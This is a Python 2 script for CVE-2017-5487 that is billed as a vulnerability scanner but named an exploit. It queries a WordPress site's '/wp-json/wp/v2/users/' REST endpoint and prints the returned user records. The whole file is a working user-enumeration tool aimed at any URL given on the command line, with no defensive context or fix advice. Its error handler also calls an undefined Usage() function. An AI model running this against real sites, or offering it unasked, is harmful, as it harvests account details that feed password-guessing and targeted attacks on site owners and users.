#!/usr/bin/python

#===============================================================				
#  WordPress Website User Information Disclosure using REST API
#  CVE-2017-5487  Vulnerability Scanner
#  Author: Kailas PATIL
#  Email: patilkr80 [AT] gmail [DOT] com
#===============================================================				

import sys, getopt   # Accept and Process System/Command-line Arguments
import urllib, json  # Send remote request to URL and Process JSON Resonse
import datetime		 # Current Date and Time

def main(argv):
	if len(sys.argv) < 2:			# Check required options
		print 'The required option is: --url or -u'
		print 'Please use -h for the list of available options.'
		sys.exit(1)  # abort because of an error
    
	websiteurl = ''    # User provided URL/Domainname
	apistring = '/wp-json/wp/v2/users/'   # Append path
	payload = ''   # Final payload request URL
	try:
		opts, args = getopt.getopt(sys.argv[1:],"hu:",["url="])
		for opt, arg in opts:
			if opt == '-h':     # HELP otion is invoked by user
				print '_______________________________________________________________'
				print 'WordPress Website User Information Disclosure using REST API'
				print '	CVE-2017-5487  Vulnerability Scanner'
				print '_______________________________________________________________'
				print ' Author: Kailas PATIL'
				print ' Email: patilkr80 [AT] gmail [DOT] com'
				print '_______________________________________________________________'
				print ' Usage: python krpexploit.py [options]'
				print '  -h 				Display the simple help and exit'
				print '  --url <URL>			The URL of the WordPress website to scan	'
				print '  -u <URL>			The URL of the WordPress website to scan	'
				print '_______________________________________________________________'
				print '	Example:'
				print '		python krpexploit.py --url http://example.com'
				print '_______________________________________________________________'
				sys.exit()
			elif opt in ("-u", "--url"):      # URL parameter is provided by user
 				websiteurl = arg
				
				print '==============================================================='				
				print 'WordPress Website User Information Disclosure using REST API'
				print '	CVE-2017-5487  Vulnerability Scanner'
				print ' Author: Kailas PATIL'
				print ' Email: patilkr80 [AT] gmail [DOT] com'
				print '_______________________________________________________________'
				print ' WebsiteURL Provided by the User to Scan:  ', websiteurl
				payload = websiteurl+apistring
				print ' Payload URL is: ', payload
				now = datetime.datetime.now()
				print (" Scan date and time : " + now.strftime("%Y-%m-%d %H:%M:%S"))
				print '==============================================================='				
				
				response = urllib.urlopen(payload)
				data = json.loads(response.read())
				#print data     # It prints unformatted data
				print json.dumps(data, indent=2, sort_keys=True)  # Prints data in JSON Formatted //Pretty Print
				print '_____________________________________________________'
				
	except getopt.GetoptError, err:
		print 'test.py -u <URL>'
		Usage()
		sys.exit(2)
   

if __name__ == "__main__":
   main(sys.argv[1:])
